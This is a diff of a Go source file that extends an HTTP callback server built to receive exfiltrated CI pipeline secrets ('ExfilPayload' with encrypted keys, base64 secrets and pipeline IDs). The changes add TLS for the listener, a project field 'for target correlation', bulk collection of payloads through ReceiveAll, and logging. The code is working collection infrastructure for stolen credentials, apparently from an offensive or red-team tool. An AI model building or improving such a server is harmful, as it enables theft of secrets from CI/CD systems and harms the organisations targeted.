@@ -7,12 +7,14 @@ import (
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/sha256"
+	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
 	"encoding/json"
 	"encoding/pem"
 	"fmt"
 	"io"
+	"log/slog"
 	"net"
 	"net/http"
 	"time"
@@ -26,6 +28,7 @@ type ExfilPayload struct {
 	EncKey     string `json:"key"`     // base64 RSA-encrypted AES key
 	Data       string `json:"data"`    // base64 unencrypted secrets
 	PipelineID string `json:"pipeline_id"`
+	Project    string `json:"project"` // CI_PROJECT_PATH for target correlation
 	// Parsed fields (populated after decrypt)
 	Secrets    map[string]string `json:"-"`
 	ReceivedAt time.Time         `json:"-"`
@@ -51,7 +54,14 @@ func NewCallbackServer(privateKey *rsa.PrivateKey, bufferSize int) *CallbackServ
 }
 
 // Start begins listening on the given address. Blocks until context is cancelled.
+// If tlsCertFile and tlsKeyFile are non-empty, the server uses TLS.
 func (cb *CallbackServer) Start(ctx context.Context, addr string) error {
+	return cb.StartTLS(ctx, addr, "", "")
+}
+
+// StartTLS begins listening with optional TLS. If certFile and keyFile are both
+// non-empty, the server serves HTTPS; otherwise it falls back to plain HTTP.
+func (cb *CallbackServer) StartTLS(ctx context.Context, addr, certFile, keyFile string) error {
 	mux := http.NewServeMux()
 	mux.HandleFunc("/", cb.handleCallback)
 
@@ -59,12 +69,30 @@ func (cb *CallbackServer) Start(ctx context.Context, addr string) error {
 		Addr:              addr,
 		Handler:           mux,
 		ReadHeaderTimeout: 10 * time.Second,
+		ReadTimeout:       15 * time.Second,
+		IdleTimeout:       60 * time.Second,
 		BaseContext:       func(_ net.Listener) context.Context { return ctx },
 	}
 
 	ln, err := net.Listen("tcp", addr)
 	if err != nil {
 		return fmt.Errorf("listen %s: %w", addr, err)
+	}
+
+	useTLS := certFile != "" && keyFile != ""
+	if useTLS {
+		cert, err := tls.LoadX509KeyPair(certFile, keyFile)
+		if err != nil {
+			_ = ln.Close()
+			return fmt.Errorf("load TLS cert/key: %w", err)
+		}
+		ln = tls.NewListener(ln, &tls.Config{
+			Certificates: []tls.Certificate{cert},
+			MinVersion:   tls.VersionTLS12,
+		})
+		slog.Info("callback server using TLS", "addr", addr, "cert", certFile)
+	} else {
+		slog.Warn("callback server using plain HTTP (no TLS)", "addr", addr)
 	}
 
 	go func() { //nolint:gosec // G118: shutdown context intentionally outlives parent
@@ -100,14 +128,45 @@ func (cb *CallbackServer) Receive(ctx context.Context, timeout time.Duration) (*
 	}
 }
 
+// ReceiveAll drains the incoming channel until the timeout expires or the context
+// is cancelled, returning all payloads received. It returns a nil error even when
+// the timeout fires (that is the normal exit condition). The expected parameter
+// hints how many payloads to expect; when all expected payloads arrive, ReceiveAll
+// returns early without waiting for the full timeout.
+func (cb *CallbackServer) ReceiveAll(ctx context.Context, timeout time.Duration, expected int) ([]*ExfilPayload, error) {
+	ctx, cancel := context.WithTimeout(ctx, timeout)
+	defer cancel()
+
+	var payloads []*ExfilPayload
+	for {
+		if expected > 0 && len(payloads) >= expected {
+			return payloads, nil
+		}
+		select {
+		case p := <-cb.incoming:
+			payloads = append(payloads, p)
+		case <-ctx.Done():
+			return payloads, nil
+		}
+	}
+}
+
 func (cb *CallbackServer) handleCallback(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
 		return
 	}
 
-	body, err := io.ReadAll(io.LimitReader(r.Body, 10<<20)) // 10MB max
-	if err != nil || len(body) == 0 {
+	body, err := io.ReadAll(io.LimitReader(r.Body, maxCallbackBody+1))
+	if err != nil {
+		http.Error(w, "bad request", http.StatusBadRequest)
+		return
+	}
+	if len(body) > maxCallbackBody {
+		http.Error(w, "request body too large", http.StatusRequestEntityTooLarge)
+		return
+	}
+	if len(body) == 0 {
 		http.Error(w, "bad request", http.StatusBadRequest)
 		return
 	}
@@ -151,7 +210,7 @@ func (cb *CallbackServer) handleCallback(w http.ResponseWriter, r *http.Request)
 	select {
 	case cb.incoming <- &payload:
 	default:
-		// Channel full, drop oldest if possible
+		slog.Warn("callback channel full, dropping payload", "project", payload.Project)
 	}
 
 	w.WriteHeader(http.StatusOK)
